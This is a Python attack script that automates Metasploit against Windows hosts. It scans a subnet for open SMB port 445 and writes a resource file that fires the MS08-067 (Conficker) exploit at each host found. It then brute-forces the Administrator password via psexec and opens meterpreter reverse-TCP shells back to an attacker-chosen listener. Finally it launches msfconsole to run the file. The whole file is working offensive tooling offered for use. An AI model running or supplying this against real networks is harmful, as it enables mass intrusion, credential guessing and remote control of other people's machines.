#To start a local program call os.system('program --options')

import os
import argparse
import sys
import nmap


def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(hosts=subNet, arguments='-T5 -p 445')
    tgtHosts = []

    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print(f'[+] Found Target Host: {host}')
                tgtHosts.append(host)
    return tgtHosts


def setupHandler(configFile, lhost, lport):
    configFile.write(f'use exploit/multi/handler\n')
    configFile.write(f'set payload windows/meterpreter/reverse_tcp\n')
    configFile.write(f'set LPORT {lport} \n')
    configFile.write(f'set LHOST {lhost} \n')
    configFile.write(f'exploit -j -z\n')
    configFile.write(f'setg DisablePayloadHandler 1\n')


def confickerExploit(configFile,tgtHost,lhost,lport):
    configFile.write(f'use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write(f'set RHOST {tgtHost} \n')
    configFile.write(f'set payload windows/meterpreter/reverse_tcp\n')
    configFile.write(f'set LPORT {lport} \n')
    configFile.write(f'set LHOST {lhost} \n')
    configFile.write(f'exploit -j -z\n')


def smbBrute(configFile,tgtHost,passwdFile,lhost,lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write(f'use exploit/windows/smb/psexec\n')
        configFile.write(f'set SMBUser ' + str(username) + '\n')
        configFile.write(f'set SMBPass ' + str(password) + '\n')
        configFile.write(f'set RHOST ' + str(tgtHost) + '\n')
        configFile.write(f'set payload windows/meterpreter/reverse_tcp\n')
        configFile.write(f'set LPORT ' + str(lport) + '\n')
        configFile.write(f'set LHOST ' + lhost + '\n')
        configFile.write(f'exploit -j -z\n')


def main():
    configFile = open('meta.rc', 'w')

    parser = argparse.ArgumentParser('[-] Usage %prog -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]') 
    
    parser.add_argument('-H', '--tgtHost', type=str, help='specify the target address[es]')
    parser.add_argument('-p', '--lport', type=str, help='specify the listen port')
    parser.add_argument('-l', '--lhost', type=str, help='specify the listen address')
    parser.add_argument('-F', '--passwdFile', type=str, help='password file for SMB brute force attempt')

    options = parser.parse_args()

    if (options.tgtHost == None) | (options.lhost == None):
      parser.print_help()
      exit(0)

    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '1337'
    passwdFile = options.passwdFile
    tgtHosts = findTgts(options.tgtHost)

    setupHandler(configFile, lhost, lport)

    for tgtHost in tgtHosts:
        confickerExploit(configFile, tgtHost, lhost, lport)
        if passwdFile != None:
            smbBrute(configFile,tgtHost,passwdFile,lhost,lport)

    configFile.close()
    os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()
